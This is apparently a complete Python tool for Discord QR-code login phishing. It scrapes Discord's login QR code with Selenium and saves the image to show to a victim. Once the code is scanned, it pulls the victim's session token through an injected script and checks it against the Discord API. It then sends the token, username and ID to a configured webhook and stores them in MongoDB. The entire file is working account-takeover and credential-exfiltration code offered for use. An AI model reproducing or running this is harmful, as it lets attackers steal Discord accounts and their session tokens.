import os
if not os.path.exists('generated'):
	os.makedirs('generated')

import json
def load_config(category, setting):
	with open("config.json") as f:
		cfg_data = json.load(f)

	return cfg_data[category][setting]

from selenium import webdriver
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from bs4 import BeautifulSoup
import base64
import time
import requests
import pymongo


client = pymongo.MongoClient(load_config("mongodb", "host"), int(load_config("mongodb", "port")))
db = client[load_config("mongodb", "db")]
tokens = db[load_config("mongodb", "collection")]

model = load_config("webdriver", "model")

if model == "chromedriver":
	driver = webdriver.Chrome(executable_path=load_config("webdriver", "path"))
elif model == "geckodriver":
	driver = webdriver.Firefox(executable_path=load_config("webdriver", "path"))

driver.get('https://discord.com/login')

try:
	element_present = EC.presence_of_element_located((By.CLASS_NAME, load_config("discord", "qr_class")))
	WebDriverWait(driver, 10).until(element_present)
	time.sleep(2)
	
	soup = BeautifulSoup(driver.page_source, features='lxml')

	div = soup.find('div', {'class': load_config("discord", "qr_class")})
	qr_code = div.find('img')['src']
	uid = hash(time.time())
	qr_code_file = os.path.join(os.getcwd(), f'generated/{uid}.png')

	img_data =  base64.b64decode(qr_code.replace('data:image/png;base64,', ''))

	with open(qr_code_file,'wb') as handler:
		handler.write(img_data)

	while driver.current_url == "https://discord.com/login":
		time.sleep(1)

	token = driver.execute_script(open("./scripts/get_token.js").read())

	

	r = requests.get('https://discord.com/api/v9/users/@me', headers={"Authorization": token})
	if r.status_code == 200:
		data = r.json()
		
		embed = {
  "content": None,
  "embeds": [
    {
      "title": f"{data['username']}#{data['discriminator']}",
      "description": f"`{data['id']}`",
      "color": None,
      "fields": [
        {
          "name": "Token",
          "value": f"||`{token}`||"
        }
      ],
      "thumbnail": {
        "url": f"https://cdn.discordapp.com/avatars/{data['id']}/{data['avatar']}.webp"
      }
    }
  ],
  "username": load_config("discord", "webhook_username"),
  "avatar_url": load_config("discord", "webhook_avatar")
}

		requests.post(load_config("discord", "webhook_url"), json=embed)

		if tokens.find_one({"discord_id": data["id"]}) is None:
			tokens.insert_one({"token": token, "discord_id": data['id'], "discord_username": data['username']})
		else:
			tokens.update_one({"discord_id": data['id']}, {"$set": {"token": token, "discord_username": data['username']}})

		os.remove(qr_code_file)
		if not int(load_config("modes", "leave_driver_open")) == 1:
			driver.quit()

except TimeoutException:
	print("Timed out waiting for page to load")
	os.remove(qr_code_file)
	if not int(load_config("modes", "leave_driver_open")) == 1:
		driver.quit()
